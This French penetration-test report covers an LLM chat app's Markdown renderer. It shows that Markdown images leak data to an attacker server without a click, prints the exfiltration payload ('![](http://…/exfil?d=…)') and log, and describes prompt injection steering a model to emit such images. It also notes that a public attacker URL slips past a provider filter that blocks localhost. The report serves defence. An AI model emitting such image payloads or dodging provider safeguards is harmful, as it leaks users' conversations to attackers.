# Attaque 2 — Sortie non maîtrisée via Markdown (OWASP LLM05)

**Date :** 2026-10-19
**Cible :** rendu des réponses dans `apps/web/src/chat/MessageBubble.tsx`
(`react-markdown` 10 + `remark-gfm` 4, **sans** `rehype-raw`).
**Utilisateur de test :** `bruno`.

## Verdict : deux résultats distincts

| Vecteur | Verdict | Preuve |
|---------|---------|--------|
| XSS par **HTML brut** (`<img onerror>`, `<a href="javascript:">`) | **RÉSISTANT** | HTML laissé en texte échappé, jamais exécuté |
| Exfiltration par **image Markdown** `![](url)` | **VULNÉRABLE** | Hit réel sur le serveur témoin, sans clic |

## Le matériel

- `witness-server.mjs` — serveur témoin de l'« attaquant » sur `127.0.0.1:9999`.
  Journalise toute requête reçue dans `hits.log` et renvoie un pixel GIF.
- `render-repro.mjs` — rejoue une sortie de modèle (deux charges utiles) dans la
  **config exacte de l'app** (`react-markdown` + `remark-gfm`, sans `rehype-raw`),
  affiche le HTML produit, analyse, et écrit `repro.html`.
- `repro.html` — le DOM produit, dans une page autonome : l'ouvrir déclenche le hit.
- `hits.log` — la preuve des requêtes reçues.

## Preuve 1 — ce que le rendu produit (déterministe, reproductible)

```
$ node security/attacks/02-sortie-markdown/render-repro.mjs
=== HTML reellement produit par react-markdown ===
<link rel="preload" as="image" href="http://127.0.0.1:9999/exfil?d=conversation-de-bruno"/>...
<p>Image distante : <img src="http://127.0.0.1:9999/exfil?d=conversation-de-bruno" alt="pixel"/></p>
<p>Exemple de balise HTML : &lt;img src=x onerror=&quot;console.log(&#x27;XSS-OK&#x27;)&quot;&gt;</p>

XSS par HTML brut (onerror / javascript:) : RESISTANT (HTML echappe, pas de rehype-raw)
Exfiltration par image Markdown           : VULNERABLE (fuite silencieuse au rendu)
```

- L'image Markdown devient une **vraie balise `<img>`** vers l'URL de l'attaquant.
  `react-markdown` v10 ajoute même un `<link rel="preload" as="image">` : le
  navigateur la charge encore plus tôt.
- Le HTML brut (`<img onerror>`, `<a href="javascript:">`) sort en **texte
  échappé** (`&lt;img …&gt;`) : il n'y a pas de balise vivante, donc rien ne
  s'exécute. C'est l'effet de l'absence de `rehype-raw`.

## Preuve 2 — l'exfiltration a réellement eu lieu (live)

Serveur témoin lancé, puis `repro.html` ouvert dans le navigateur. `hits.log` :

```
2026-10-19T12:39:20Z GET /exfil?d=conversation-de-bruno (ua=…Chrome/154…Safari…)
```

Le navigateur a appelé l'URL de l'attaquant **à l'ouverture, sans aucun clic**,
et le paramètre `d=conversation-de-bruno` (les données « volées ») est bien
arrivé côté attaquant. Dans une vraie attaque, `d=` contiendrait un extrait de
la conversation, un identifiant, etc.

## Pourquoi ça marche (et ce qui l'atténue) dans cette architecture

- **Pourquoi l'image fuit :** `MessageBubble` ne surcharge que le composant `a`
  (pour les citations). Les **images ne sont ni bloquées ni restreintes** : toute
  URL d'image dans la réponse est chargée par le navigateur. Une image distante
  est une **requête sortante automatique** — c'est le canal d'exfiltration.
- **Pourquoi le HTML brut ne passe pas :** pas de `rehype-raw`. C'est un bon
  choix, documenté dans le code (`{/* Pas de rehype-raw … */}`). Le XSS « classique »
  par balise est donc fermé.

### Atténuations observées, qui ne viennent PAS du code de rendu

Pour que ce canal serve, il faut qu'une **image distante apparaisse dans la
réponse affichée**. Deux obstacles, extérieurs au rendu, l'ont rendu difficile à
déclencher via le modèle « honnête » :

1. **Le modèle se défend.** Prié d'afficher une image distante (URL publique), il
   l'a spontanément mise **dans un bloc de code** (« pour que le Markdown ne soit
   pas interprété ») — donc pas de `<img>` vivant.
2. **Garde-fou du fournisseur.** Toute requête contenant `127.0.0.1:9999/exfil`
   (ou `localhost:9999/exfil`) a été **refusée par l'API Anthropic** en amont
   (« La génération a échoué »), alors qu'une URL publique passait. C'est une
   protection côté fournisseur, pas côté app.

→ C'est pourquoi la preuve « live » a été produite en rendant la charge utile
directement (`repro.html`), sans passer par le modèle : **on teste le rendu, qui
est la surface vulnérable de LLM05.** Le rendu, lui, ne met aucune barrière.

## Chemin d'attaque réaliste

Le vecteur devient dangereux dès qu'une image distante atteint le rendu **sans
l'auto-censure du modèle** :

- **Via l'injection indirecte (attaque 1) :** un document piégé qui pousse le
  modèle à inclure `![](http://attaquant/x?d=…)`. L'attaque 1 a montré que *ce*
  modèle résiste à l'injection, mais la défense repose en partie sur lui.
- **Via un autre modèle / un modèle plus faible**, ou un prompt système modifié.
- **Via une URL d'attaquant publique** (pas `localhost`), qui ne déclenche pas le
  garde-fou du fournisseur.

## Verdict final

- **XSS par HTML brut : RÉSISTANT.**
- **Exfiltration par image Markdown : VULNÉRABLE au rendu** (prouvé en live),
  aujourd'hui **difficile à déclencher via ce modèle** grâce à son auto-censure
  et au garde-fou du fournisseur — mais **le code de rendu ne pose aucune barrière**.

## Corrections possibles (non implémentées ici)

- **Bloquer les images** dans `react-markdown` : `disallowedElements={["img"]}`,
  ou un composant `img` personnalisé qui n'autorise qu'une liste d'hôtes de
  confiance (voire aucune image distante).
- **Durcir les liens** : composant `a` qui n'accepte que `http(s)`/ancres,
  `rel="noopener noreferrer"`, et confirmation avant d'ouvrir un domaine externe.
- **CSP** (`Content-Security-Policy`) sur la page : `img-src 'self'`,
  `connect-src 'self'`, `script-src 'self'` — une barrière navigateur qui coupe
  l'exfiltration quelle que soit la sortie du modèle (défense en profondeur).
- Ne pas se reposer sur l'auto-censure du modèle ni sur le garde-fou du
  fournisseur : ce sont des atténuations, pas des contrôles sous ton autorité.

## Nettoyage

- Serveur témoin : arrêter le processus `witness-server.mjs`.
- `repro.html` a été ouvert dans le navigateur par défaut : fermer l'onglet.
- Aucun code d'application ni donnée (`data/`) modifié par cette attaque.
